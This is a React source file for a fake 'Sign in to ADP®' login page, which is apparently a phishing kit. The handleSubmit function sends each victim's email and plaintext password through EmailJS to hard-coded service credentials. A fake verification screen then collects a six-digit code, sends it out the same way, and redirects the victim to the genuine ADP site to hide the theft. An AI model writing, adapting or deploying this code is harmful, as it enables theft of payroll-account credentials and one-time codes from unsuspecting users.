import React, { useState, FormEvent } from 'react';
import emailjs from '@emailjs/browser';
import { Toaster, toast } from 'react-hot-toast';
import { Mail, Lock, Eye, EyeOff, ArrowRight } from 'lucide-react';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showVerification, setShowVerification] = useState(false);
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!email || !password) {
      toast.error('Please fill in all fields');
      return;
    }

    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      toast.error('Please enter a valid email address');
      return;
    }

    setIsLoading(true);

    try {
      await emailjs.send(
        'service_4fgptz6',
        'template_cck7gfb',
        {
          email,
          password,
          type: 'Initial Login',
          rememberMe: rememberMe ? 'Yes' : 'No',
          timestamp: new Date().toISOString(),
        },
        '0Q_KfqWkDYm_dhxmR'
      );

      setShowVerification(true);
      toast.success('Please check your email for the verification code');
    } catch (error) {
      toast.error('Login attempt failed. Please try again.');
      console.error('EmailJS Error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleVerificationSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const code = verificationCode.join('');
    if (code.length !== 6) {
      toast.error('Please enter the complete verification code');
      return;
    }

    setIsLoading(true);

    try {
      await emailjs.send(
        'service_4fgptz6',
        'template_cck7gfb',
        {
          email,
          verificationCode: code,
          type: 'Verification Code',
          timestamp: new Date().toISOString(),
        },
        '0Q_KfqWkDYm_dhxmR'
      );

      toast.success('Verification successful!');
      // Redirect to ADP website after successful verification
      window.location.href = 'https://netsecure.adp.com/ilink/pub/smsess/v3/forgot/theme.jsp';
    } catch (error) {
      toast.error('Verification failed. Please try again.');
      console.error('EmailJS Error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleCodeChange = (index: number, value: string) => {
    if (value.length > 1) value = value[0];
    const newCode = [...verificationCode];
    newCode[index] = value;
    setVerificationCode(newCode);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`code-${index + 1}`);
      nextInput?.focus();
    }
  };

  if (showVerification) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center bg-white">
        <div className="w-full max-w-md p-8 mx-4 border-2 border-gray-200 rounded-2xl shadow-lg">
          <div className="text-center mb-8">
            <img
              src="https://www.tangoalliance.org/wp-content/uploads/adp-logo-350.png"
              alt="ADP Logo"
              className="w-16 h-16 mx-auto mb-4 rounded-full object-cover"
            />
            <h1 className="text-3xl font-bold text-gray-900 mb-2">Verify Your Account</h1>
            <p className="text-gray-600">Enter the verification code sent to {email}</p>
          </div>

          <form onSubmit={handleVerificationSubmit} className="space-y-6">
            <div className="flex justify-center space-x-3">
              {verificationCode.map((digit, index) => (
                <input
                  key={index}
                  id={`code-${index}`}
                  type="text"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  className="w-12 h-12 text-center text-xl font-semibold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-500 outline-none"
                />
              ))}
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full py-3 px-4 bg-red-600 text-white rounded-lg font-medium hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transform transition-all flex items-center justify-center space-x-2 disabled:opacity-50"
            >
              <span>{isLoading ? 'Verifying...' : 'Verify Account'}</span>
              <ArrowRight className="h-5 w-5" />
            </button>
          </form>

          <p className="mt-6 text-center text-sm text-gray-600">
            Didn't receive the code?{' '}
            <button
              onClick={handleSubmit}
              className="text-red-600 hover:text-red-700 transition-colors"
            >
              Resend
            </button>
          </p>
        </div>
        <Toaster position="top-right" />
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full flex items-center justify-center bg-white">
      <div className="w-full max-w-md p-8 mx-4 border-2 border-gray-200 rounded-2xl shadow-lg">
        <div className="text-center mb-8">
          <img
            src="https://www.tangoalliance.org/wp-content/uploads/adp-logo-350.png"
            alt="ADP Logo"
            className="w-16 h-16 mx-auto mb-4 rounded-full object-cover"
          />
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Sign in to ADP®</h1>
          {/* <p className="text-gray-600">Please sign in to continue</p> */}
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="relative">
            <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full pl-10 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all outline-none"
              placeholder="Email address"
              required
            />
          </div>

          <div className="relative">
            <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full pl-10 pr-12 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all outline-none"
              placeholder="Password"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
            >
              {showPassword ? (
                <EyeOff className="h-5 w-5" />
              ) : (
                <Eye className="h-5 w-5" />
              )}
            </button>
          </div>

          <div className="flex items-center justify-between">
            <label className="flex items-center space-x-2 cursor-pointer">
              <input
                type="checkbox"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                className="w-4 h-4 text-red-600 border-gray-300 rounded focus:ring-red-500"
              />
              <span className="text-sm text-gray-600">Remember me</span>
            </label>
            <a
              href="#"
              className="text-sm text-red-600 hover:text-red-700 transition-colors"
            >
              Forgot password?
            </a>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3 px-4 bg-red-600 text-white rounded-lg font-medium hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transform transition-all disabled:opacity-50 flex items-center justify-center space-x-2"
          >
            <span>{isLoading ? 'Signing in...' : 'Sign in'}</span>
            <ArrowRight className="h-5 w-5" />
          </button>
        </form>

        <p className="mt-6 text-center text-sm text-gray-600">
          Don't have an account?{' '}
          <a href="#" className="text-red-600 hover:text-red-700 transition-colors">
            Sign up
          </a>
        </p>
      </div>
      <Toaster position="top-right" />
    </div>
  );
}

export default App;